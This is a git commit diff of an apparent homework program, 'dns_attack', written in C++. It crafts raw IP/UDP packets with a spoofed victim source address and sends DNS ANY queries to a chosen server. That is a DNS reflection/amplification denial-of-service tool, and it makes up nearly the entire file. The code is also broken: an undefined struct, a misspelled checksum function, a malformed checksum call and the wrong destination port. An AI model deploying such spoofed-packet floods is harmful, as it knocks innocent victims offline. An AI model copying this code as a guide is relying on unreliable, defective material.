f30a580c050c08b6c9931c63126bb0cb8ff98e9d
CTFang's Macbook <andy89923@gmail.com>
2022-03-03 16:49:20 +0800

    Update

--- HW1/main.cpp
+++ HW1/main.cpp
@@ -1,12 +1,15 @@
 #include <iostream>
 #include <cstdlib>
 #include <cstring>
+#include <ctime>
 
 #include <sys/socket.h>
 #include <arpa/inet.h>    // inet_addr
 #include <netinet/ip.h>   // Provides declarations for ip header
 #include <netinet/udp.h>  // Provides declarations for udp header
 using namespace std;
+
+#define DEFAUL_QUERY_NAME "www.google.com"
 
 // Checksum (from internet)
 unsigned char checksum(unsigned char *buf, int len){
@@ -39,8 +42,16 @@ void socket_init(int& sock_r) {
         cout << "Success to set IP_HDRINCL\n";
 }
 
-struct dns_hdr {
+struct pseudo_header {
+    u_int32_t source_address;
+    u_int32_t dest_address;
+    u_int8_t placeholder;
+    u_int8_t protocol;
+    u_int16_t udp_length;
+};
 
+struct dnshdr {
+    // short -> 2 byte
     unsigned short id;      // ID
     unsigned short flags;   // DNS Flags
 
@@ -49,52 +60,146 @@ struct dns_hdr {
 
     unsigned short auth;    // Authority RR
     unsigned short add;     // Additional RR
+};
+
+struct query {
+
+    unsigned short qtype;
+    unsigned short qclass;
 
 };
 
-/* Command
-$ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
-*/
+void construct_dns_hdr(dnshdr* h) {
+    h -> id = htons(0x7419);
+    h -> flags = htons(0x0100);
 
-void construct_dns_hdr(dns_hdr* h) {
-    h -> id = 0x7419;
-    h -> flags = 0x0100;
+    h -> qcnt = htons(1);
+    h -> acnt = 0;
 
-    h -> qcnt = 0x0001;
-    h -> acnt = 0x0000;
-
-    h -> auth = 0x0000;
-    h -> add  = 0x0000;
+    h -> auth = 0;
+    h -> add  = 0;
 }
 
+void construct_dns_query(unsigned char *qury, unsigned char* host) {
+    int poi = 0;
+    strcat((char*) host, ".");
+
+    for(int i = 0 ; i < strlen((char*) host); i++) {
+        if (host[i] == '.') {
+            *qury++ = i - poi;
+            for ( ; i > poi; poi++) {
+                *qury++ = host[poi];
+            }
+            poi++;
+        }
+    }
+    *qury++ = 0x00;
+}
+
+void construct_ip_hdr(struct iphdr *ip, int tot_len, char* source_ip, sockaddr_in addr) {
+    ip -> version  = 4;
+    ip -> ihl      = 5;
+    ip -> tos      = 0;
+    ip -> tot_len  = tot_len;
+    ip -> id       = htonl(rand());
+    ip -> frag_off = 0;
+    ip -> ttl      = 64;
+    ip -> protocol = IPPROTO_UDP;
+    ip -> check    = 0;
+    ip -> saddr    = inet_addr(source_ip);
+    ip -> daddr    = addr.sin_addr.s_addr;
+}
+
+void construct_udp_hdr(udphdr *u, int udp_len, int source_port) {
+
+    u -> source = htons(source_port);
+    u -> dest = htons(53);
+
+    u -> len   = htons(udp_len);
+    u -> check = 0;
+}
+
+/* Command
+
+$ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
+
+*/
 int main(int argc, char const *argv[]) {
+    srand(time(NULL));
 
-    int sock_r;
-    socket_init(sock_r);
+    unsigned char dns_data[128];
+    dnshdr *dnshdr = (dnshdr*) &dns_data;
+    construct_dns_hdr(dnshdr);
 
-    struct sockaddr_in addr;
+
+    unsigned char *dns_name  = (unsigned char*) &dns_data[sizeof(dnshdr)];
+    unsigned char dns_rcrd[32];
+    
+    strcpy(dns_rcrd, DEFAUL_QUERY_NAME);
+    construct_dns_query(dns_name , dns_rcrd);
+
+    query *q;
+    q = (query*) &dns_data[sizeof(dnshdr) + (strlen(dns_name) + 1)];
+    q -> qtype = htons(0x00ff);
+    q -> qclass = htons(0x1);
+
+
 
     // DNS IP setting
+    struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port   = htons(80);
     addr.sin_addr.s_addr = inet_addr(argv[3]);
 
-    char source_ip[32];
+
+    char datagram[4096], source_ip[32], *data, *psgram;
+
+    memset(datagram, 0, 4096);
     strcpy(source_ip, argv[1]);
 
-
-    char datagram[4096], *data;
-    memset(datagram, 0, 4096);
-
-    struct iphdr  *ip_header  = (struct iphdr*  ) (datagram);
-    struct udphdr *udp_header = (struct udphdr* ) (datagram + sizeof(struct iphdr)); 
-	struct dns_hdr *dns_header = (struct dns_hdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
-    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_hdr);
-
-    construct_dns_hdr(dns_header);
+    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) +1);
 
 
 
+    // struct pseudo_header psh;
+    struct iphdr  *ip_header  = (struct iphdr* ) (datagram);
+    struct udphdr *udp_header = (struct udphdr*) (datagram + sizeof(struct iphdr)); 
+	struct dnshdr *dns_header = (struct dnshdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
+    
+    int hdr_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnshdr);
+    int tot_len = hdr_len + (strlen(dns_name) + 1) + sizeof(query);
+    
+
+    construct_ip_hdr(ip_header, tot_len, source_ip, addr);
+    ip_header -> check = checksum(((unsigned short *) datagram, ip_header -> tot_len));
+
+
+    int udp_len = 8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
+    construct_udp_hdr(udp_header, udp_len, atoi(argv[2]));
+
+
+    int tmp_len = sizeof(struct udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);
+
+    struct ps_hdr pshdr;
+    pshdr.saddr = inet_addr(argv[1]);
+    pshdr.daddr = addr.sin_addr.s_addr;
+    pshdr.filler = 0;
+    pshdr.protocol = IPPROTO_UDP;
+    pshdr.len = htons(tmp_len);
+
+    int siz = sizeof(ps_hdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);
+    psgram = malloc(siz);
+
+    memcpy(psgram, (char*) &pshdr, sizeof(ps_hdr));
+    memcpy(psgram + sizeof(ps_hdr), udp_header, tmp_len);
+        
+    udp_header -> check = ckecksum((unsigned short*) psgram, siz);
+
+    int sock_r;
+    socket_init(sock_r);
+
+    sendto(sock_r, datagram, ip_header -> tot_len, 0, (struct sockaddr*) &addr, sizeof(addr));
 
     return 0;
 }
